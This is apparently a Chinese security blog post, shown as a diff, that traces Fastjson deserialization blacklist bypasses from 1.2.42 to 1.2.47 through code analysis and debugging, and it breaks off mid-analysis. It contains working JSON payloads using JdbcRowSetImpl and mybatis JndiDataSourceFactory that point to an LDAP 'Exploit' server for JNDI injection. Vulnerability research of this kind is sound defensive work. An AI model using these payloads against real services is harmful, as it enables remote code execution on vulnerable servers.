+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.42</td>
+<td>33238344207745342</td>
+<td>0x761619136cc13eL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-6316154655839304624</td>
+<td>0xa85882ce1044c450L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-5472097725414717105</td>
+<td>0xb40f341c746ec94fL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>-4608341446948126581</td>
+<td>0xc00be1debaf2808bL</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>3256258368248066264</td>
+<td>0x2d308dbbc851b0d8L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>4841947709850912914</td>
+<td>0x43320dc9d2ae0892L</td>
+<td></td>
+</tr>
+<tr>
+<td>1.2.62</td>
+<td>6534946468240507089</td>
+<td>0x5ab0cb3071ab40d1L</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p>
+<ol>
+<li>修改明文黑名单为黑名单hash</li>
+<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
+</ol>
+<p>对于第二点，仔细跟进去看一下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hash算法常量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line">        <span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line">        <span class="comment">// 可以发现这边只进行了一次删除</span></span><br><span class="line">        <span class="keyword">if</span> ((((BASIC</span><br><span class="line">                ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">                * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">                * PRIME;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">            <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure>
+
+<p>确实有效的干掉了L开头；结尾的payload。</p>
+<h1 id="1-2-42-绕过"><a href="#1-2-42-绕过" class="headerlink" title="1.2.42 绕过"></a>1.2.42 绕过</h1><p>但是在以上的处理中，发现只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键PoC为：<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p>
+<p>在1.2.22-1.2.42版本运行都能成功触发：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130109049.png" alt="image-20200706130109049"></p>
+<h2 id="绕过分析-1"><a href="#绕过分析-1" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;-<span class="number">8720046426850100497L</span>,-<span class="number">8109300701639721088L</span>,-<span class="number">7966123100503199569L</span>,-<span class="number">7766605818834748097L</span>,-<span class="number">6835437086156813536L</span>,-<span class="number">4837536971810737970L</span>,-<span class="number">4082057040235125754L</span>,-<span class="number">2364987994247679115L</span>,-<span class="number">1872417015366588117L</span>,-<span class="number">254670111376247151L</span>,-<span class="number">190281065685395680L</span>,<span class="number">33238344207745342L</span>,<span class="number">313864100207897507L</span>,<span class="number">1203232727967308606L</span>,<span class="number">1502845958873959152L</span>,<span class="number">3547627781654598988L</span>,<span class="number">3730752432285826863L</span>,<span class="number">3794316665763266033L</span>,<span class="number">4147696707147271408L</span>,<span class="number">5347909877633654828L</span>,<span class="number">5450448828334921485L</span>,<span class="number">5751393439502795295L</span>,<span class="number">5944107969236155580L</span>,<span class="number">6742705432718011780L</span>,<span class="number">7179336928365889465L</span>,<span class="number">7442624256860549330L</span>,<span class="number">8838294710098435315L</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706130507612.png" alt="image-20200706130507612"></p>
+<p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p>
+<p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p>
+<p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>。</p>
+<p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。</p>
+<h1 id="1-2-43-漏洞修复"><a href="#1-2-43-漏洞修复" class="headerlink" title="1.2.43 漏洞修复"></a>1.2.43 漏洞修复</h1><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p>
+<p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>的部分代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line">            <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="comment">//L开头，；结尾</span></span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="comment">//LL开头</span></span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">                    <span class="comment">//直接爆出异常</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见就对了LL开头的绕过进行了封堵。</p>
+<p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p>
+<p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p>
+<h1 id="1-2-43-绕过"><a href="#1-2-43-绕过" class="headerlink" title="1.2.43 绕过"></a>1.2.43 绕过</h1><p>之前在类的加载<code>TypeUtils.loadClass</code>发现有两种特殊处理方式：</p>
+<ul>
+<li>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</li>
+<li>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</li>
+</ul>
+<p>之前版本都是主攻第二种，这里的绕过方式就是针对的第一种，也就是针对<code>[</code>的骚操作。</p>
+<p>先直接上payload嗷：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[&#123;,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键PoC：<code>[com.sun.rowset.JdbcRowSetImpl</code></p>
+<p>但是如果我们一开始payload直接这样写是会报错的：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: exepct <span class="string">'['</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此改下payload，在第一个逗号前面加个”[“：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure>
+
+<p>因此就修改得到最终版payload，能够成功触发：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706143651966.png" alt="image-20200706143651966"></p>
+<h2 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144236090.png" alt="image-20200706144236090"></p>
+<p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144524443.png" alt="image-20200706144524443"></p>
+<p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706144631729.png" alt="image-20200706144631729"></p>
+<h1 id="1-2-44-漏洞修复"><a href="#1-2-44-漏洞修复" class="headerlink" title="1.2.44 漏洞修复"></a>1.2.44 漏洞修复</h1><p>修补了上面的<code>[</code>利用方式。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706145821383.png" alt="image-20200706145821383"></p>
+<p>直接抛异常，难受住，家人们；</p>
+<h1 id="1-2-44-绕过"><a href="#1-2-44-绕过" class="headerlink" title="1.2.44 绕过"></a>1.2.44 绕过</h1><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
+<p>maven：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.4.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接给出payload，要连LDAP或RMI都可以：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="string">"properties"</span>:&#123;<span class="string">"data_source"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.45的版本中可以看到：</p>
+<table>
+<thead>
+<tr>
+<th>version</th>
+<th>hash</th>
+<th>hex-hash</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.46</td>
+<td>-8083514888460375884</td>
+<td>0x8fd1960988bce8b4L</td>
+<td>org.apache.ibatis.datasource</td>
+</tr>
+</tbody></table>
+<p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p>
+<p>之后更新的版本比如1.2.46也都在补充黑名单。</p>
+<p>运行即可成功触发，害怕：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706151641022.png" alt="image-20200706151641022"></p>
+<h2 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。</p>
+<p>继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。</p>
+<p>由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。</p>
+<p>直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的,这里面还是需要调试时候直接断点跳转的：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706154549939.png" alt="image-20200706154549939"></p>
+<p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p>
+<p>函数调用栈如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">10</span>, Exploit</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">188</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1086</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">544</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">203</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">411</span>, InitialContext (javax.naming)</span><br><span class="line">setProperties:<span class="number">56</span>, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span><br><span class="line">deserialze:-<span class="number">1</span>, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">267</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">384</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1356</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1322</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">152</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">162</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">131</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">8</span>, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure>
+
+<h1 id="1-2-47-通杀！"><a href="#1-2-47-通杀！" class="headerlink" title="1.2.47 通杀！"></a>1.2.47 通杀！</h1><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p>
+<p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p>
+<p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">        <span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                    &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//通过以上全部检查，就可以从这里读取clazz</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里对一些特殊的class进行处理，不重要</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//特性判断等</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706155729468.png" alt="image-20200706155729468"></p>
+<p>仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的<code>return clazz</code>出去才有机会。</p>
+<ol>
+<li>因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。</li>
+<li>白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足<code>TypeUtils.getClassFromMapping(typeName) != null</code>（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。</li>
+</ol>
+<p>那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。</p>
+<p>于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步<code>TypeUtils.getClassFromMapping</code>中得到的恶意类，但是这边都瞅瞅，后面也会用到）</p>
+<ol>
+<li>TypeUtils.getClassFromMapping(typeName)</li>
+<li>deserializers.findClass(typeName)</li>
+</ol>
+<h2 id="deserializers-findClass-typeName"><a href="#deserializers-findClass-typeName" class="headerlink" title="deserializers.findClass(typeName)"></a>deserializers.findClass(typeName)</h2><p>先看desesrializers，一个hashmap</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private final IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers         = new IdentityHashMap&lt;Type, ObjectDeserializer&gt;();</span><br></pre></td></tr></table></figure>
+
+<p>因为我们是从中取值，关注一下它是在哪里赋值的,发现是在<code>initDeserializers</code>里面赋值的：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706161123129.png" alt="image-20200706161123129"></p>
+<p>initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。</p>
+<p>除此之外还有两个函数会影响到desesrializers这个map：</p>
+<ol>
+<li><strong>getDeserializer</strong></li>
+</ol>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</span><br></pre></td></tr></table></figure>
+
